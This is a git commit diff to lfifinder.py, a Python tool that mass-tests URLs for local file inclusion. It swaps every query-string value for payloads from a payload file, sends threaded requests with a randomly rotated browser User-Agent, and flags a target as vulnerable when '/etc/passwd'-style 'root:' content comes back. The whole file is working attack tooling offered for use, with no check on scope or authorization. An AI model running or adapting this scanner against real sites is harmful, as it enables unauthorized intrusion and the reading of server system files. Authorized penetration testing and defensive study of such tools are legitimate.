6b5f3fc45d309ba406955d0a16a81e8c2dd4afc2
Bhagirath Saxena <bk2358678@gmail.com>
2022-12-25 18:08:25 +0530

    Update

--- lfifinder.py
+++ lfifinder.py
@@ -1,54 +1,65 @@
-import concurrent.futures
+import re
 import sys
+import argparse
 import urllib.parse
-import urllib.request
+import requests
+import concurrent.futures
+import random
 
-# Read payloads from the file
-with open('lfi_payloads.txt', 'r') as f:
-  payloads = f.read().splitlines()
+# Parse the command-line arguments
+parser = argparse.ArgumentParser()
+parser.add_argument("--threads", type=int, default=8, help="number of threads to use")
+args = parser.parse_args()
 
-# Define a function to send a request to a URL with a given payload
-def send_request(url, payload):
-  # Parse the URL
-  parsed_url = urllib.parse.urlparse(url)
+with open("lfi_payloads.txt", "r") as f:
+    payloads = f.read().splitlines()
 
-  # Get the list of query parameters
-  query_params = urllib.parse.parse_qs(parsed_url.query)
+# Read the input URLs from sys.stdin
+url_list = sys.stdin.read().splitlines()
 
-  # Replace the value of each query parameter with the given payload
-  for param in query_params:
-    query_params[param] = [payload]
 
-  # Rebuild the query string without encoding it
-  query_string = urllib.parse.urlencode(query_params, doseq=True, quote_via=urllib.parse.quote_plus, safe='/')
+def check_url(url, payload):
+    # Use a regular expression to replace all values in the query string with the payload
+    cleaned_url = re.sub(r'=([^&]*)', f'={urllib.parse.quote(payload)}', url)
+    decoded_url = urllib.parse.unquote(cleaned_url)
 
-  # Rebuild the URL with the modified query string
-  modified_url = urllib.parse.urlunparse((parsed_url.scheme, parsed_url.netloc, parsed_url.path, parsed_url.params, query_string, parsed_url.fragment))
+    # Send a request
+    user_agents = [
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0.2 Safari/604.4.7",
+        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:15.0) Gecko/20100101 Firefox/15.0.1",
+        "Mozilla/5.0 (Linux; Android 7.0; SM-G930V Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36",
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15",
+        "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
+        "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36",
+        "Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36",
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3 Edge/16.16299",
+        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 Safari/537.36",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",
+        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:15.0) Gecko/20100101 Firefox/15.0.1",
+        "Mozilla/5.0 (Linux; Android 7.0; SM-G930V Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36"
+    ]
 
-  # Send a request to the modified URL
-  try:
-    response = urllib.request.urlopen(modified_url)
-    data = response.read()
-    data = data.decode('utf-8')
-    if 'root:' in data:
-      print("VULNERABLE: " + modified_url)
+    headers = {"User-Agent": random.choice(user_agents)}
+
+    response = requests.get(decoded_url, headers=headers)
+    if 'root:' in response.text:
+        print(f"\033[1;31mVULNERABLE: {decoded_url}\033[0;0m")
     else:
-      print("NOT VULNERABLE: " + modified_url)
-  except urllib.error.URLError as e:
-      pass
-  except KeyboardInterrupt:
-      exit(0)
-  except:
-      exit(127)
+        print(f"\033[1;32mNOT VULNERABLE: {decoded_url}\033[0;0m")
 
-# Read lines of input from stdin until EOF is reached
-for line in sys.stdin:
-  # Strip the newline character from the end of the line
-  line = line.strip()
 
-  # Create a ThreadPoolExecutor with 50 worker threads
-  with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
-    # Iterate through the payloads
+# Create a ThreadPoolExecutor with the specified number of threads
+with concurrent.futures.ThreadPoolExecutor(max_workers=args.threads) as executor:
+    # Iterate over the payloads
     for payload in payloads:
-      # Submit a task to the executor to send the request with the current payload
-      future = executor.submit(send_request, line, payload)
+        # Iterate over the URLs
+        for url in url_list:
+            try:
+                # Submit the task to the executor
+                future = executor.submit(check_url, url, payload)
+                # Wait for the task to complete
+                future.result()
+            except KeyboardInterrupt:
+                exit(0)
